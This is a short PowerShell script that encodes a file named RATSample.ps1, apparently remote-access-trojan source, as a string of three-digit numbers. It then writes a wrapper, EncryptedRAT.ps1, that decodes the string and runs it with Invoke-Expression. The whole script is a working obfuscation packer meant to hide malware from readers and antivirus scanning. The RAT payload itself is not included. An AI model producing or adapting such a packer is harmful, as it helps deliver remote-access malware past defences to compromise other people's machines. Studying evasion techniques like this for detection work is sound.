$originalScript = Get-Content -Path "../../RATSample.ps1" -Raw
$encryptedScript = ($originalScript.ToCharArray() | ForEach-Object {
        $asciiValue = [int][char]$_ + 1
        $asciiValue.ToString("D3")
    }) -join ''
$decryptionScript = @"
`$encryptedScript = '$encryptedScript'
`$decryptedScript = ''
for (`$i = 0; `$i -lt `$encryptedScript.Length; `$i+=3) {
    `$asciiValue = [int]::Parse(`$encryptedScript.Substring(`$i, 3)) - 1
    `$decryptedScript += [char]`$asciiValue
}
Invoke-Expression `$decryptedScript
"@

$decryptionScript | Out-File -FilePath "EncryptedRAT.ps1"